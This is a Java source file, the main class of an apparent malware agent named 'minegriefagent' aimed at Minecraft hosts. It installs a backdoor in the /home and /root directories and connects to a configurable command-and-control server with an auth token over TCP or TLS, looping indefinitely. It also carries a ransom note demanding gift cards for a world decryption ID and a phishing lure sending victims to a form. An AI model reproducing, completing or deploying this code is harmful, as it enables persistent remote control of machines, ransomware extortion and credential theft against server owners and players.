package com.chebuya.minegriefagent;

import com.chebuya.minegriefagent.client.ClientService;
import com.chebuya.minegriefagent.transport.ClientTransport;
import com.chebuya.minegriefagent.transport.TCPSTransport;
import com.chebuya.minegriefagent.transport.TCPTransport;

import static com.chebuya.minegriefagent.capabilities.Backdoor.installBackdoor;
import static com.chebuya.minegriefagent.util.Logging.configureLogging;
import static com.chebuya.minegriefagent.util.Logging.LOGGER;


public class Main {
    // Change these
    private static final String C2 = "127.0.0.1:1337";
    private static final String TOKEN = "dpxpwDcLFkPZx9S6JYjb";
    private static final String TRANSPORT_TYPE = "TCPS";
    private static final int SLEEP_TIME = 3;
    private static final boolean DO_LOGGING = true;

    public static final String ransomMessage = "\n\n\nYou've been HACKED by MINEGRIEF! To recover your world, email xxxxx@xxxxxx.com with enough giftcards to buy 10,000 Minecoins and the decryption ID of DECRYPTION_ID\n\nYou can purchase giftcards at https://shop.minecraft.net/products/minecraft-shop-gift-card";
    public static final String phishMessage = "Our systems have detected unusual traffic coming from your account.\n\nPlease complete the form at PHISH_URL to prove you are not a robot";

    public static void main(String[] args) {
        configureLogging(DO_LOGGING);

        LOGGER.info("installing backdoor");
        installBackdoor("/home");
        installBackdoor("/root");

        String[] addrInfo = C2.split(":");
        String ip = addrInfo[0];
        int port = Integer.parseInt(addrInfo[1]);

        LOGGER.info("configuring transport");
        ClientTransport transport = null;
        switch (TRANSPORT_TYPE) {
            case "TCPS":
                transport = new TCPSTransport();
                break;
            default:
                transport = new TCPTransport();
        }

        LOGGER.info("starting client service");
        ClientService client = new ClientService(transport, SLEEP_TIME * 1000, TOKEN, ip, port);
        while (true) {
            client.Start();
        }
    }
}
